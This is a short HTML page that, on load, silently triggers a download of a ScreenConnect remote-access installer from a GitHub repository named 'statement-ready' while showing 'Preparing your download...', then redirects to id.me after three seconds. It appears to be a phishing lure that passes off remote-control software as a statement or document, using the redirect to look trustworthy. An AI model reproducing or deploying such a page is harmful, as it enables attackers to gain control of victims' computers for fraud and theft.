<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>

<p>Preparing your download...</p>

<script>
    // Start file download
    const link = document.createElement("a");
    link.href = "https://github.com/waxgroup105-lab/statement-ready/raw/refs/heads/main/ScreenConnect.ClientSetup.msi";
    link.download = "https://github.com/waxgroup105-lab/statement-ready/raw/refs/heads/main/ScreenConnect.ClientSetup.msi";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    // Redirect after a short delay
    setTimeout(function () {
        window.location.href = "https://id.me";
    }, 3000);
</script>

</body>
</html>
